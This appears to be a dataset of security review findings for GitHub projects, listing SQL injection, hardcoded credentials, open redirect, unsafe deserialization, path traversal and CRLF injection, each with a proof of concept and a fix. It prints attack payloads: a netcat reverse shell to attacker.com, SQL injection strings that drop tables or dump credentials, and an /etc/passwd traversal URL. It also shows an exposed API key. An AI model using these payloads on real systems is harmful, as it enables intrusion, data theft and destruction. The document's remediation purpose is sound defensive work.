An attacker inputs specially crafted strings into input fields such as Contact_No, Booking_ID, or search attributes. This input manipulates the SQL query structure, allowing the attacker to bypass authentication, retrieve unauthorized data, delete or modify data, or cause denial of service.



Why it Happens:
Because user inputs are directly embedded into SQL queries without sanitization or parameterization, the database engine interprets injected SQL commands.


Security Implications:
Data leakage or unauthorized data access.
Data corruption or deletion.
Potential full compromise of the database.
Loss of data integrity and availability.


Suggested Fix:
Use parameterized queries with placeholders (? or named parameters) instead of string interpolation.


Patch fix for fetch_contact function (line ~161):
my_cursor.execute(""SELECT Customer_ID, * FROM customer WHERE Contact_No = ?"", (self.Customer_Contact_No_var.get(),))
Similarly, fix other queries:


Patch Fix for delete_data (line ~292):
my_cursor.execute(""DELETE FROM room_booking WHERE Booking_ID = ?"", (self.Customer_Booking_ID_var.get(),))


Patch Fix for search (line ~415), dynamic column names cannot be parameterized directly. Validate self.search_by_table_var.get() against a whitelist of allowed column names before using it in the query, and parameterize the value:

allowed_columns = [""Name"", ""Check_In"", ""Check_Out"", ""Room_Type"", ""Allotted_Room"", ""Meal""]
column = self.search_by_table_var.get()
if column not in allowed_columns:
    raise ValueError(""Invalid search column"")
my_cursor.execute(f""SELECT * FROM room_booking WHERE {column} = ?"", (self.search_by_attribute_var.get(),))


Patch fix for booked_room_no (line ~485):
my_cursor.execute(""UPDATE room_types SET Availability = 'No' WHERE Room_No = ?"", (self.Allotted_room_var.get(),))"
158,1745917795892,https://github.com/SrinithiSaiprasath/Hotel-Management-System/blob/main/hotelamanagement.py,CWE-798,High,2025-04-29T09:09:55.000Z,2025-04-29T09:53:48.000Z,"Explanation: 
Username and password are hardcoded in the source code (lines 10-11).


POC:
username = ""root""  # Line 10
password = ""password""  # Line 11


Root Cause:  File hotelamanagement.py
Credentials stored in plaintext within the codebase.


Exploit Scenario: 
Attackers with access to the source code (e.g., via repository leaks or shared environments) gain full database access.


Why it Happens: 
Lack of secrets management practices.


Security Implications: 
Unauthorized data access, privilege escalation, and data exfiltration.


Suggested Fix:

# Use environment variables or a secrets manager
import os
username = os.getenv(""DB_USER"")
password = os.getenv(""DB_PASSWORD"")"
159,1745917918101,https://github.com/zulip/zulip/blob/main/zerver/views/registration.py,CWE-601,Low,2025-04-29T10:01:07.000Z,2025-04-29T11:59:42.000Z,"Vulnerability Type:
CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
Proof of Concept:
Vulnerable Code:
@typed_endpoint
def realm_redirect(request: HttpRequest, *, next: str = """") -> HttpResponse:
    if request.method == ""POST"":
        form = RealmRedirectForm(request.POST)
        if form.is_valid():
            subdomain = form.cleaned_data[""subdomain""]
            realm = get_realm(subdomain)
            redirect_to = urljoin(realm.url, settings.HOME_NOT_LOGGED_IN)

            if next:
                redirect_to = append_url_query_string(
                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
                )

            return HttpResponseRedirect(redirect_to)
Explanation:
•	The next parameter comes from user input.
•	It is directly appended into a redirect URL without validating whether next is safe (e.g., it could point to an external malicious domain).
•	An attacker could craft a URL like:
•	https://trustedsite.com/accounts/realm_redirect?next=https://malicious.com
which, after submission, redirects users to https://malicious.com.
Solution:
•	Validate the next parameter to ensure it is internal (relative URL only).
•	Reject full external URLs (those containing a domain).
Example fix:
from django.utils.http import url_has_allowed_host_and_scheme

if next and url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}):
    redirect_to = append_url_query_string(
        redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
    )
Severity: High

Root Cause:
The application fails to properly validate user-supplied URL parameters (specifically next) before redirecting users, which allows attackers to control redirection targets.

Exploit Scenario:
An attacker crafts a link with a malicious next parameter and tricks users into clicking it. After login or realm selection, users are redirected to a phishing website that looks like the real application, leading to credential theft or session hijacking.
Why It Happens:
The next parameter from user input is blindly appended to internal URLs without validating that it leads to an internal location, allowing attackers to supply fully external URLs.
Security Implications:
•	Phishing attacks
•	User session hijacking
•	Loss of user trust
•	Potential credential theft
•	Serious damage to application reputation

Suggested Fix:
diff --git a/registration.py b/registration.py
index abcdef1..1234567 100644
--- a/registration.py
+++ b/registration.py
@@ def realm_redirect(request: HttpRequest, *, next: str = """") -> HttpResponse:
-            if next:
-                redirect_to = append_url_query_string(
-                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
-                )
+            from django.utils.http import url_has_allowed_host_and_scheme
+            if next and url_has_allowed_host_and_scheme(next, allowed_hosts={request.get_host()}):
+                redirect_to = append_url_query_string(
+                    redirect_to, urlencode({REDIRECT_FIELD_NAME: next})
+                )

"
160,1745919302504,farhan0715/Chatbot-Using-Gemini/blob/b738c4ea24ab0f1538ec0fa6d2e37b39d85ca237/multipdf.py#L169,CWE-502: Deserialization of Untrusted Data,High,2025-04-29T09:35:02.000Z,2025-04-29T14:57:25.000Z,"Vulnerable Code

# In user_input() function:
new_db = FAISS.load_local(
    ""faiss_index"", 
    embeddings, 
    allow_dangerous_deserialization=True  # Critical vulnerability
)

Root Cause Analysis:

1.Dangerous Flag : allow_dangerous_deserialization=True bypasses LangChain's safety checks
2.No Integrity Checks: Missing SHA-256 verification of index files
3.Insecure Defaults: FAISS.load_local() doesn't validate serialized data structure
4. Write Permissions: Application may run with privileges allowing index replacement

Exploit Scenarios:
A. Remote Code Execution
Attack Vector: Malicious index file upload
Impact: Full server compromise via:

# Example payload to open reverse shell
return (os.system, ('nc -e /bin/sh attacker.com 4444',))

B. Data Exfiltration
Attack Vector: Tampered index exfiltrating PDF contents
Impact: Theft of sensitive documents via:

return (lambda x: open(""pdf_text.txt"").read(), (None,))

C. Denial of Service
Attack Vector: Corrupted index file
Impact: Application crash on load attempt

Security Implications

1.Arbitrary Code Execution: Full system compromise
2.Privilege Escalation: Root access if app runs as privileged user
3.Data Breach	:Theft of processed PDF contents
4.Reputation Damage: Loss of customer trust

Suggested fix :
def load_safe_index(path, embeddings):
    if not os.path.exists(f""{path}/index.faiss""):
        raise FileNotFoundError(""Index missing"")
    
    # Verify file signature
    with open(f""{path}/index.faiss"", ""rb"") as f:
        if not f.read(4) == b'FAIS':  # Magic number
            raise ValueError(""Invalid index format"")
    
    return FAISS.load_local(path, embeddings)  # Safe default"
161,1745920318448,https://github.com/warlordthesaviour/ModelConverter,CWE-36,Critical,2025-04-29T09:51:58.000Z,2025-04-29T14:52:11.000Z,"Vulnerability Type:CWE-36: Absolute Path Traversal.
path:ModelConverter\web\hello.py
Proof of Concept:
Vulnerable Code:

@app.route('/download', methods=['GET'])
def download():
    username = request.args.get('username')
    filename = request.args.get('filename')
    return send_file(os.path.join(DOWNLOAD_FOLDER, username, filename), as_attachment=True)
Explanation:
The above code takes user input (username and filename) and joins it using os.path.join() to form a file path. However, this function does not prevent path traversal when given malicious input. An attacker can exploit this by inserting relative paths such as ../../../../etc/passwd. This bypasses the intended directory and exposes files outside of the download folder. The send_file function will then serve these unauthorized files.

Severity:
Critical

Root Cause:
The root cause of the issue is the use of os.path.join() with untrusted input to construct file paths. If the input contains absolute paths or traversal sequences, os.path.join() may resolve the path to locations outside the safe directory. Since the input is not validated before being used in the send_file() function, the attacker can fully control what file is read and served by the application.

Exploit Scenario:
An attacker crafts a request like:

http://localhost/download?username=../../&filename=../../../../etc/passwd
This causes the joined path to resolve to a sensitive file outside the download directory. If the server is configured to allow such downloads, the attacker receives the contents of /etc/passwd or any other accessible file. Repeating this attack with various paths can result in the leakage of configuration files, source code, or other internal resources.

Why It Happens:
The vulnerability occurs because the application directly incorporates user input into file path operations without verifying that the final path remains within an allowed directory. The use of os.path.join() does not perform any security checks, allowing input like ../ or absolute paths to override intended behavior. This results in paths that escape the designated file directory, leading to unauthorized access.

Security Implications:
If successfully exploited, the vulnerability allows attackers to access sensitive server-side files. This can include system configuration files, database credentials, or internal application logic. The exposure of such files could lead to further system compromise, privilege escalation, or lateral movement within the network. It also undermines data confidentiality and increases the risk of information leakage to unauthorized users.

Suggested Fix:
Replace os.path.join() with werkzeug.utils.safe_join(), which securely joins paths and ensures that the final resolved path stays within the base directory. If the result attempts to traverse outside the base path, safe_join() returns None or raises an error. This prevents path traversal attacks by validating the complete path after joining. Here is the fixed code:

    safe_path = safe_join(DOWNLOAD_FOLDER, username, filename)
    return send_file(safe_path, as_attachment=True)
This ensures that file access is limited to the intended directory, preventing attackers from reaching unauthorized files."
162,1745920862687,AnnuNITW/Hotel-Management-System-Using-Python/blob/main/customer.py,"CWE-89, CWE-259",High,2025-04-29T10:01:02.000Z,2025-04-29T14:58:41.000Z,"The code contains two high severity issues including CWE-89 (SQL Injection) and CWE-259 (Use of Hard-Coded Password)

====================================================

CWE-89 (SQL Injection):

Explanation: The code concatenates user inputs directly into SQL queries, allowing attackers to inject malicious SQL commands.


POC:
For search() method, input ""mobile' OR '1'='1"";--"" in the search field to dump all customer records.


Root Cause: 

File 
https://github.com/AnnuNITW/Hotel-Management-System-Using-Python/blob/main/customer.py
Line 385: con_cursor.execute(""select * from customer where ""+str(self.search_var.get())+"" LIKE'%""+str(self.txt_search.get())+""%'"")

String concatenation of search_var and txt_search directly into the SQL query.


Exploit Scenario: 
Attackers bypass authentication, dump sensitive data, or delete records.


Why it Happens: 
Lack of parameterized queries for search functionality.


Security Implications: 
Full database compromise, data theft, and unauthorized access.


Suggested Fix:
Use Parameterized Queries instead of directly using user input.

Patch:

con_cursor.execute(
    f""SELECT * FROM customer WHERE {self.search_var.get()} LIKE %s"",
    ('%' + self.txt_search.get() + '%',)
)

=============================================================================

CWE-259 (Use of Hard-Coded Password)

Explanation: 
Database credentials (mysql123) are hardcoded in multiple methods.


Root Cause: 
File https://github.com/AnnuNITW/Hotel-Management-System-Using-Python/blob/main/customer.py
Lines 263, 287, 322, 350 and 382: Repeated in add_data(), fetch_data(), update(), Delete(), and search().


Exploit Scenario: 
Attackers extract credentials from decompiled code or shared repositories.


Why it Happens: 
Lack of secure credential management.


Security Implications: 
Unauthorized database access and data exfiltration.


Suggested Fix:
Use environment variables or a secure secrets manager.

Patch:

conn = mysql.connector.connect(
    host=os.getenv('DB_HOST'),
    user=os.getenv('DB_USER'),
    password=os.getenv('DB_PASS'),
    database='worksheet'
)"
163,1745921588744,https://github.com/warlordthesaviour/fp-bd-dlp-aws,CWE-117,Low,2025-04-29T10:13:08.000Z,2025-04-29T15:30:06.000Z,"Vulnerability Type:
CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')

Proof of Concept:
The version future==0.18.2 contains a putheader() function that does not sanitize carriage return (\r) or line feed (\n) characters. This flaw allows an attacker to inject arbitrary headers by embedding newline characters into the header value. For instance, when a header like ""example.com\r\nX-Evil: injected"" is passed, it creates an unintended second header. The vulnerable method fails to prevent CRLF sequences, enabling malicious payloads to be injected directly into the HTTP request structure, leading to potential header manipulation and security bypass.

Severity:
low

Root Cause:
The root cause of this vulnerability lies in the absence of input validation in the putheader() function within future.backports.http.client. Specifically, the function does not detect or sanitize embedded newline characters in header values, allowing malicious content to be inserted into HTTP headers. This lack of filtering allows the construction of malformed HTTP requests, which can lead to various forms of header injection or response manipulation, severely compromising request integrity.

Exploit Scenario:
An attacker could exploit this vulnerability by providing a malicious string containing newline characters, such as ""example.com\r\nInjected: yes"", as a header value in an HTTP request. When this string is passed to the putheader() function, it results in a second unintended header being appended to the request. This could allow attackers to inject or modify HTTP headers, enabling attacks such as cache poisoning, HTTP request smuggling, or bypassing authentication and logging systems, depending on the application's structure.

Why It Happens:
The vulnerability occurs because the putheader() method in future==0.18.2 lacks proper validation of header values, particularly failing to sanitize CRLF sequences (\r, \n). This design flaw allows malformed header values to be included in HTTP requests without triggering errors, creating a vector for attackers to manipulate the structure and content of HTTP communications. The use of unsanitized input directly in protocol-level operations is a common cause of injection vulnerabilities.

Security Implications:
Exploiting this vulnerability can allow attackers to manipulate HTTP requests in a way that compromises the security of the application. This includes techniques such as HTTP response splitting, where a malicious user injects extra headers or entire responses, or request smuggling, which can be used to bypass security devices, hijack sessions, poison caches, or inject data into other users' sessions. It undermines the trust boundary between client and server and can lead to data exposure, privilege escalation, or denial of service.

Suggested Fix:
Update the future package to the latest version (e.g., future==1.0.0 if available), where input validation is expected to be added to prevent header injection. Developers should ensure that any carriage return (\r) or line feed (\n) characters in header values are explicitly rejected or sanitized before being used in HTTP requests. As an alternative to using the vulnerable module, developers are advised to switch to Python’s standard http.client module in Python 3, which includes built-in protections against CRLF injection. Applying validation wrappers around header-setting functions can also serve as an immediate short-term mitigation."
164,1745922028465,https://github.com/jackc/pgx.git,CWE-89,Critical,2025-04-29T10:20:28.000Z,2025-04-29T15:49:34.000Z,"Vulnerability (CVE-2024-27289 / GHSA-m7wr-2xf7-cm9p)
Component: internal/sanitize/sanitize.go in jackc/pgx ≤ 4.18.1
CWE: 89 – Improper Neutralization of Special Elements used in an SQL Command (SQL-Injection)
Trigger: pgx simple protocol (PreferSimpleProtocol=true or ConnConfig.PreferSimpleProtocol = true)
Fixed in: 4.18.2 (commit f94eb0e2f96782042c96801b5ac448f44f0a81df)

1 Root cause
Inside Query.Sanitize this block formats numeric placeholders (lines 45-67 of the unpatched sanitize.go you shared):

go
Copy
Edit
case int64:
    str = strconv.FormatInt(arg, 10)
    // Prevent SQL-injection via line-comment creation
    if arg < 0 {                 // ← ONLY negatives wrapped
        str = ""("" + str + "")""
    }
case float64:
    str = strconv.FormatFloat(arg, 'f', -1, 64)
    if arg < 0 {                 // ← positive numbers left bare
        str = ""("" + str + "")""
    }
Only negative numbers are surrounded by parentheses.
If the application text contains a literal minus directly before $N, and the attacker supplies:

$N → a positive number (e.g. 123) → pgx emits 123 (no parentheses)

next placeholder on the same line → a string that begins with a second minus (e.g. "" -- payload\n"")

…the two adjacent dashes become the PostgreSQL line-comment opener --. Everything that follows, including the closing quote and the rest of the legitimate statement, is ignored; the attacker-controlled payload executes.

2 Step-by-step exploitation
go
Copy
Edit
// Conditions: simple protocol ON and attacker controls amount & note.
config.PreferSimpleProtocol = true

stmt := `INSERT INTO transfers(amount, note) VALUES(-$1, $2);`
conn.Exec(ctx, stmt,
          123,                       // $1  positive ⇒ prints 123
          "" -- UNION SELECT secret FROM users; --"") // $2 payload
pgx output (unpatched):

sql
Copy
Edit
INSERT INTO transfers(amount, note)
VALUES(-123' -- UNION SELECT secret FROM users; --');
The first minus is part of the SQL text, the second minus comes from the start of the string literal – together they form --.

PostgreSQL treats -- as “comment to end of line”, discards the closing quote, and executes the injected UNION SELECT.

3 Files directly involved

File	Responsibility	Vulnerable lines
internal/sanitize/sanitize.go	Builds the final SQL string in Query.Sanitize and SanitizeSQL.	45-67 (numeric formatting)
internal/sanitize/sanitize_test.go	Unit-tests sanitisation but does not cover “minus + string” combo, so CI stayed green.	
4 Patch (commit f94eb0e2…)
diff
Copy
Edit
- // wrap only negatives
- if arg < 0 {
-     str = ""("" + str + "")""
- }
+ // wrap *all* numbers
+ str = ""("" + str + "")""
Parenthesising every numeric guarantees the literal minus in the query is now followed by (, so a second minus can never sit next to it; -- can no longer be fashioned.

5 Real-world impact
Data exfiltration – UNION SELECT or blind-injection leaks customer records, credentials, tokens.

Data corruption / DoS – payloads like ; DROP TABLE orders;-- erase or lock data.

Privilege escalation – many Go services run with elevated DB roles; injected DDL can create super-users or write untrusted PL/pgSQL that shells the host.

Supply-chain reach – popular CLI tools and micro-services using pgx’s simple protocol inherit the flaw.

Severity – NVD CVSS 3.1 = 8.1 (High) (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).

6 Mitigation
Upgrade to pgx ≥ 4.18.2 (contains the unconditional-parentheses fix).

If upgrade is delayed:

Disable simple protocol (PreferSimpleProtocol=false).

Ensure no SQL text uses - $n followed by another placeholder on the same line.

Adopt server-side prepared statements or ORMs that rely on PostgreSQL’s extended protocol.

Enforce least-privilege roles so that, even if injection re-emerges elsewhere, blast radius is minimal.

With these protections—and the patched sanitizer—the “line-comment creation” trick is impossible, closing the SQL-injection vector in pgx."
165,1745922137866,15saipranav/File-management-system-in-python/blob/master/Assignment-III/server.py,CWE-522,Medium,2025-04-29T10:22:17.000Z,2025-04-29T15:03:33.000Z,"Explanation: 
Passwords are stored in plaintext in userlog.txt.


Root Cause: 
File: https://github.com/15saipranav/File-management-system-in-python/blob/master/Assignment-III/server.py
Line 171 : file.writelines(user_data) in register function writes the sensitive data as plaintext to a file.


Exploit Scenario: 
Server compromise exposes all user credentials to an attacker in plaintext.


Why it Happens: 
No password hashing or encryption of files is implemented.


Security Implications: 
Credential theft, account takeover attacks through data leak or shared directories.


Suggested Fix:
Use password hashing to hash the passwords before storing:

Patch:

import hashlib
...
def register(self, user_name, pwd):
    hashed_pwd = hashlib.sha256(pwd.encode()).hexdigest()
    user_data = f""{user_name},{hashed_pwd}\n"""
166,1745923430726,https://github.com/nomaanahmeddd/Billing-System-using-Python,"CWE-89, CWE-798",High,2025-04-29T10:43:50.000Z,2025-04-29T15:07:44.000Z,"The code contains one high severity CWE-89 (SQL Injection) and one medium severity CWE-798 (Hardcoded Credentials) issue. 
==============================================================
CWE-89:

Explanation:
SQL Injection in find_item() : Direct string formatting in SQL queries allows attackers to inject malicious SQL code.
SQL Injection in add_item(): Unsanitized item_name and item_price used in string formatting.
SQL Injection in modify_item(): Unfiltered item_id, item_name, and item_price in UPDATE query.
SQL Injection in date_wise_sell(): Unsanitized date inputs in BETWEEN clause.
SQL Injection in search_item(): Unfiltered LIKE clause with direct string formatting.


POC: 
SQL Injection in find_item() : Enter 1 OR 1=1 as the item ID to retrieve all items.
SQL Injection in add_item(): Inject test"", 100); DROP TABLE items; -- as item name.
SQL Injection in modify_item(): Set item_id to 1; DROP TABLE bills; --
SQL Injection in date_wise_sell(): Use 2000-01-01"" UNION SELECT user, password FROM mysql.user; -- as start date.
SQL Injection in search_item(): Enter %"" UNION SELECT 1,table_name,3 FROM information_schema.tables; --



Root Cause: 
File https://github.com/nomaanahmeddd/Billing-System-using-Python/blob/main/billing_system.py
SQL Injection in find_item() : Line cursor.execute('select * from items where id ={}'.format(no)) in find_item()
SQL Injection in add_item(): Lines with sql = 'select * from items where item_name like ""%{}%""'.format(item_name) and sql = 'insert into items(...'
SQL Injection in modify_item(): Line sql = 'update items set item_name = ""{}"", price ={} where id={}'.format(...)
SQL Injection in date_wise_sell(): Line sql = 'select * from bills where bill_date between ""{}"" and ""{}""'.format(...)
SQL Injection in search_item(): Line sql ='select * from items where item_name like ""%{}%"";'.format(item_name)


Exploit Scenario: 
SQL Injection in find_item() : An attacker retrieves all item records by manipulating the no parameter.
SQL Injection in add_item(): Attacker deletes the items table or exfiltrates data.
SQL Injection in modify_item(): Attacker deletes billing records or modifies prices.
SQL Injection in date_wise_sell(): Attacker extracts sensitive user credentials.
SQL Injection in search_item(): Attacker maps database schema.




Why it Happens: 
Raw user input concatenated into SQL without parameterization.


Security Implications: 
Unauthorized data access, database tampering, privilege escalation, Financial fraud, data integrity loss and Credential theft.


Suggested Fix:
Use Parametrized Queries

Patch Fix:

cursor.execute('select * from items where id = %s', (no,))

cursor.execute('select * from items where item_name LIKE %s', (""%"" + item_name + ""%"",))
cursor.execute('insert into items(item_name,price) values(%s,%s)', (item_name, item_price))

cursor.execute('update items set item_name=%s, price=%s where id=%s', (item_name, item_price, item_id))

cursor.execute('select * from bills where bill_date BETWEEN %s AND %s', (start_date, end_date))

cursor.execute('select * from items where item_name LIKE %s', (""%"" + item_name + ""%"",))

===============================================================

CWE-798 :

Explanation: 
Fixed hardcoded credentials (admin/1234) with no password hashing.


Root Cause: 
File https://github.com/nomaanahmeddd/Billing-System-using-Python/blob/main/billing_system.py
Function login(): Line 35 : if password == '1234'


Security Implications: 
Easy credential guessing, exposure of credentials in case of code leakage.


Suggested Fix:
Use environment variables and bcrypt hashing.

Patch Fix:

import os
import bcrypt

stored_hash = os.getenv('ADMIN_HASH')  # Pre-computed bcrypt hash
input_hash = bcrypt.hashpw(password.encode(), stored_hash.encode())
if bcrypt.checkpw(password.encode(), stored_hash.encode()):
    # Grant access"
167,1745925406969,https://github.com/sequelize/sequelize/tree/v6.19.0,CWE-89,Critical,2025-04-29T11:16:46.000Z,2025-04-29T15:32:33.000Z,"Summary
Sequelize versions prior to 6.19.1 are affected by a critical SQL injection vulnerability (CVE-2023-25813 / GHSA-wrh9-cjv3-2hpw) stemming from unsafe handling of the replacements option when used alongside where clauses 
NVD
GitHub
. A naive regex‐based formatter (formatNamedParameters) would substitute all :name tokens in the SQL string—including those inside quoted literals—allowing an attacker to inject arbitrary SQL commands like OR true; DROP TABLE users; 
VulnGuide
. The vulnerability carries a CVSS v3.1 score of 9.8 (or 10.0 under certain configurations) with Network attack vector, Low complexity, No privileges required, No user interaction, and High impact to confidentiality, integrity, and availability 
Aqua Vulnerability Database
CVE Database
. It was patched in Sequelize 6.19.1 by replacing the old formatter with a context-aware parser (injectReplacements) that skips replacements inside strings, comments, and identifiers 
Vulert
.

Vulnerability Background
Sequelize ORM and the Replacements Feature
Sequelize is a promise-based Node.js ORM supporting Postgres, MySQL, MariaDB, SQLite, and MSSQL, which offers a replacements option for raw queries to inject values into SQL templates 
VulnGuide
.

Affected Versions
All Sequelize releases before 6.19.1 are vulnerable when replacements is used with where clauses, as explicitly noted in the GitHub advisory GHSA-wrh9-cjv3-2hpw 
NVD
GitHub
. Mend Intelligence also classifies CVE-2023-25813 as CRITICAL with a CVSS 10.0 rating 
Mend.io Documentation
.

Technical Details
Vulnerable Parameter Formatting
In the vulnerable code (located in src/sequelize.js around lines 600–606), Sequelize did:

js
Copy
Edit
if (options.replacements) {
  if (Array.isArray(options.replacements)) {
    sql = Utils.format([sql].concat(options.replacements), this.options.dialect);
  } else {
    sql = Utils.formatNamedParameters(sql, options.replacements, this.options.dialect);
  }
}
Here, formatNamedParameters blindly ran a global regex replace on every :name placeholder, regardless of SQL context 
GitHub
.

Regex-Based Replacement Flaw
The legacy formatNamedParameters function matched :(?<name>[a-z_][0-9a-z_]*) and substituted the escaped value, but did not track whether the match lay inside a quoted string, comment, or identifier 

. Snyk’s analysis highlights that this allowed dangerous payloads—e.g. OR true; DROP TABLE users;—to slip through replacements and execute arbitrary SQL 
VulnGuide
.

Exploitation Techniques
Attack Vector
An attacker only needs control over a value passed to replacements; no database credentials or elevated privileges are required. The flaw can be exploited remotely over the network with no user interaction 
CVE Database
.

Example Exploit
Consider:

js
Copy
Edit
User.findAll({
  where: or(
    literal('soundex(""firstName"") = soundex(:firstName)'),
    { lastName: lastNameInput },
  ),
  replacements: { firstName: attackerPayload },
});
If attackerPayload = ""OR true; DROP TABLE users; --"", the naive processor yields:

sql
Copy
Edit
... WHERE soundex(""firstName"") = soundex('OR true; DROP TABLE users; --')
  OR ""lastName"" = ''OR true; DROP TABLE users; --''
which executes the injected DROP TABLE command when the ORM runs the query 
GitHub
.

Impact Analysis
Severity and Scope
CVSS v3.1 Base Score: 9.8 (Critical) 
Aqua Vulnerability Database

CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 
CVE Database

EPSS Exploitation Probability: 4.66% over the next 30 days 
CVE Database

Impact on C.I.A
Confidentiality: Full data exfiltration possible by appending UNION SELECT or dumping tables 
CVE Database

Integrity: Unauthorized writes, updates, or deletions (e.g., DROP, UPDATE) can corrupt or erase data 
CVE Database

Availability: Destructive commands (DROP TABLE, TRUNCATE) can render services inoperable 
CVE Database

Mitigation and Remediation
Upgrade to Sequelize 6.19.1 or later, where the vulnerable formatNamedParameters is replaced by injectReplacements in src/utils/sql.ts, performing a stateful, context-aware parse that ignores placeholders inside quotes, comments, and identifiers 
Vulert
.

Workaround: If you cannot upgrade immediately, avoid combining replacements with where clauses, or manually sanitize and strictly validate all user inputs before passing them to Sequelize 
NVD
.

References

NVD: CVE-2023-25813 Detail, Sequelize vulnerability prior to 6.19.1 
NVD

Aqua Security AVD: SQL injection severity 9.8 CRITICAL 
Aqua Vulnerability Database

GitHub Advisory GHSA-wrh9-cjv3-2hpw 
GitHub

Snyk: “SQL Injection via the replacements statement” 
VulnGuide

Mend Intelligence: CVSS 10.0 classification 
Mend.io Documentation

CVE Details: CVSS vector, EPSS score 
CVE Database

Vulert: Patch in 6.19.1, upgrade recommendation"
168,1745926846793,https://github.com/aws-samples/agentsforbedrock-retailagent /csbot_agent.py,CWE-89,High,2025-04-29T11:40:46.000Z,2025-04-29T14:48:06.000Z,"Vulnerability Type:
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Proof of Concept:
In the `lambda_handler.py` file, the functions `return_customer_info` and `place_shoe_order` build SQL queries by directly inserting user-controlled input without any sanitization or parameterization. For example:
```python
query = 'SELECT customerId, customerName, ... FROM CustomerInfo WHERE customerName LIKE ""%' + custName + '%""'
cursor.execute(query)
Here, if custName is crafted maliciously by an attacker, it can manipulate the SQL query structure and inject harmful SQL code.

Severity: High

Root Cause: The vulnerable functions directly concatenate user input variables into SQL query strings instead of using parameterized queries. Since user input is included in SQL statements without escaping or proper binding, malicious actors can alter the structure of the SQL command. This insecure practice introduces critical SQL Injection risks.

Exploit Scenario: An attacker can supply a malicious CustomerName input such as Alice""; DROP TABLE CustomerInfo; --, which closes the intended query and adds a second, destructive SQL command. As a result, the CustomerInfo table can be dropped (deleted) from the database, causing data loss and service disruption.

Why It Happens: The vulnerability occurs because the developer used string concatenation to dynamically construct SQL queries with user inputs. Without validating, escaping, or binding the user data properly, the database engine interprets the crafted input as executable SQL code instead of harmless data, leading to query manipulation.

Security Implications: Successful exploitation of this vulnerability can lead to severe consequences, including unauthorized modification or destruction of data, data leakage, unauthorized access to sensitive information, complete database compromise, and potential escalation of privileges. This can severely impact the confidentiality, integrity, and availability of the application’s data.

Suggested Fix: The code should be refactored to use parameterized queries (also known as prepared statements) to separate query logic from user-supplied values. This ensures that user input is always treated strictly as data, preventing it from being executed as part of SQL commands. For example:


query = 'SELECT customerId, customerName, ... FROM CustomerInfo WHERE customerName LIKE ?'
cursor.execute(query, (f'%{custName}%',))
Using parameter binding provides a clean and secure method of constructing SQL queries and fully mitigates SQL Injection risks."
169,1745927148967,https://github.com/vidhi-github/react-mini-project/blob/main/src/WeatherSearch.jsx,"CWE-522, CWE-200",High,2025-04-29T11:45:48.000Z,2025-04-29T15:05:15.000Z,"Vulnerability Type:
CWE-522: Insufficiently Protected Credentials
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
(related to hardcoded API keys and lack of validation)

 Proof of Concept:

const API_KEY = ""407327cef93c632e2549e6440178f6a7"";
This API key is embedded directly in the frontend, making it accessible to anyone using browser dev tools.

No sanitization is performed on the city input before passing it to the URL, e.g.:

`${API_URL}?q=${city}&appid=${API_KEY}&units=metric`
 Severity:
High (Critical if API has billing/quota limits)

 Root Cause:
The API key is exposed in client-side code and no input validation is performed on user-provided city names. This allows anyone to extract the key and make arbitrary API calls, possibly exhausting your quota or causing unexpected API errors.

 Exploit Scenario:
An attacker inspects the page source or uses browser dev tools to grab the API key. They write a script that floods the OpenWeatherMap API with automated requests using that key, eventually exhausting the API quota, causing outages, or triggering rate limits. They could also input garbage values or script injections to break the frontend.

 Why It Happens:
The design assumes the API key can be safely used in frontend code and that user input to the weather endpoint is always valid. No server-side proxy is used to protect the key or mediate access, and no checks sanitize or validate the city input.

 Security Implications:
API abuse or quota exhaustion

Increased cloud billing costs if on a paid plan

Service denial to real users due to exhausted API limits

Crashes or broken UI from malformed API responses

Potential phishing or abuse of API key on other apps

 Suggested Fix:
 Move the API_KEY to a backend server or use a serverless proxy that hides the key.

 If keeping client-side, store in .env and reference it using process.env.REACT_APP_WEATHER_API_KEY, then set up restrictions on the key in the OpenWeatherMap console (e.g., domain lock).

 Add input sanitization to trim and reject invalid city names:

const sanitized = city.trim();
if (!/^[a-zA-Z\s]{2,50}$/.test(sanitized)) throw new Error(""Invalid city"");"
170,1745927530704,https://github.com/KunalArora/multiple-camera_multiple-people_tracking/api.py,CWE-668,Medium,2025-04-29T11:52:10.000Z,2025-04-29T14:49:08.000Z,"Vulnerability Type:
CWE-668: Exposure of Resource to Wrong Sphere

Proof of Concept:
In the app.py file, the Flask application is started with the following line:
app.run(host='0.0.0.0', port=5000)
The host value 0.0.0.0 binds the Flask server to all network interfaces, including public-facing IP addresses. This allows the Flask app to accept incoming connections from any machine that can reach the server’s IP address and port, potentially exposing APIs unintentionally. If deployed without additional security measures, this configuration makes the server easily discoverable and accessible by attackers or unauthorized users, even over the internet.

Severity:
Medium

Root Cause:
The root cause of this vulnerability is the misconfiguration of the Flask application’s host binding. Setting the host to 0.0.0.0 tells the operating system to listen for incoming connections on all available network interfaces, including interfaces connected to untrusted networks. This configuration is commonly used during development for testing across devices but is unsafe when accidentally deployed in production without proper network access restrictions or security controls in place.

Exploit Scenario:
An attacker scanning a public or private network can detect that the Flask application is listening on port 5000. By sending specially crafted HTTP requests to exposed endpoints, the attacker can interact with the application, retrieve data, invoke functionality that was never meant for public access, or even chain this access with other vulnerabilities such as authentication bypasses or injection attacks. This exposure significantly lowers the barrier for remote exploitation.

Why It Happens:
Developers often configure Flask apps with host=0.0.0.0 to make them reachable from other devices during local development and testing. However, if this setting is not changed back before deploying to production or cloud environments, the server remains accessible to anyone who can route to the machine. Flask's built-in server is intended only for development use and lacks production-grade security features, making the exposure risk even greater.

Security Implications:
Leaving the server bound to 0.0.0.0 in production can lead to unauthorized access, information leakage, abuse of internal APIs, exposure of sensitive operations, and increased risk of broader system compromise. Attackers could potentially access functionality that was never meant to be public, causing financial loss, reputation damage, or data breaches. In worst-case scenarios, it could lead to full system takeovers if the server runs with elevated privileges or has additional unpatched vulnerabilities.

Suggested Fix:
